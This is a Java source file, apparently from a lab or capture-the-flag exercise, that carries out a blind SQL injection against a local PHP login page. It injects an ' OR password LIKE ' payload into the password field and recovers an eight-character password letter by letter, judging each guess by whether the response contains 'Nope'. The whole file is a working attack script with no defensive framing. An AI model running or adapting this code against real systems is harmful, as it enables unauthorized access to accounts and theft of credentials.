package com.company;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class SQLInject {

    public static void main(String[] args) {
	    String baseURL = "http://localhost:1212/osc/request.php?username=request&password=%27OR%20password%20LIKE%20%27REPLACE%25";
        System.out.println(injectWebsite(baseURL,8));
    }

    /**
     *
     * @param baseUrl - Website with password params at the end
     * @param passwordLength - Known length of password
     * @return - Password returned or error
     */
    private static String injectWebsite(String baseUrl,int passwordLength){
        char[] alphabet = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        String password = "";
        for (int i = 0;i < 8;i++){
            //Generate string for placeholder
            String placeholder = "";
            for (int j = 0;j < 8;j++){
                placeholder += (i == j) ? "REPLACE" : "_";
            }
            String url = baseUrl.replace("REPLACE",placeholder);
            for (int k = 0;k < alphabet.length;k++){
                String urlWithParams = url.replace("REPLACE",String.valueOf(alphabet[k]));
                String check = readData(urlWithParams);
                if(!check.contains("Nope") && !check.contains("HTTP 404 ERROR")){
                    //Valid Letter returned
                    password += alphabet[k];
                }
            }
        }
        password = (password.length() == 0) ? "Error: Password not found" : password;
        return password;
    }

    private static String readData(String urlName){
        try{
            StringBuffer buffer = new StringBuffer();
            URL url = new URL(urlName);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setDoInput(true);
            connection.connect();
            BufferedReader in;
            in = new BufferedReader( new InputStreamReader(connection.getInputStream()));
            String inputLine = in.readLine();
            while(inputLine != null){
                buffer.append(inputLine);
                inputLine = in.readLine();
            }
            in.close();
            connection.disconnect();
            return buffer.toString();
        }catch (IOException e){
            System.out.println("Returned a HTTP 404 ERROR "+urlName);
        }
        return "";
    }
}
